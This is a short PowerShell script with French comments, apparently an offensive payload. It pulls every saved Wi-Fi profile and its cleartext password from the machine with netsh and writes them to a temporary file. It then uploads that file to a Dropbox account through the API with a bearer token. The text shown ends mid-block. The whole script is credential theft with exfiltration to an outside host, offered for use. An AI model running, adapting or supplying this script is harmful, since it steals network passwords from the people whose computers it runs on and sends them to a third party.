# Récupérer les profils Wi-Fi et les écrire dans un fichier temporaire
netsh wlan show profiles | Select-String "Tous les profils utilisateurs\W+\:(.+)$" | ForEach-Object {
    $profileName = $_.Matches.Groups[1].Value.Trim()
    netsh wlan show profile name="$profileName" key=clear | Select-String "Contenu de la clé\W+\:(.+)$" | ForEach-Object {
        [PSCustomObject]@{
            PROFILE_NAME = $profileName
            PASSWORD = $_.Matches.Groups[1].Value.Trim()
        }
    }
} | Format-Table -AutoSize | Out-File -FilePath $env:TEMP/--wifi-pass.txt -Encoding UTF8

# Upload du fichier vers Dropbox
if (-not [string]::IsNullOrEmpty($db)) {
    $arg = '{ "path": "/--wifi-pass.txt", "mode": "add", "autorename": true, "mute": false }'
    $authorization = "Bearer " + $db
    $headers = @{
        "Authorization" = $authorization
        "Dropbox-API-Arg" = $arg
        "Content-Type" = 'application/octet-stream'
    }
    Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $env:TEMP/--wifi-pass.txt -Headers $headers
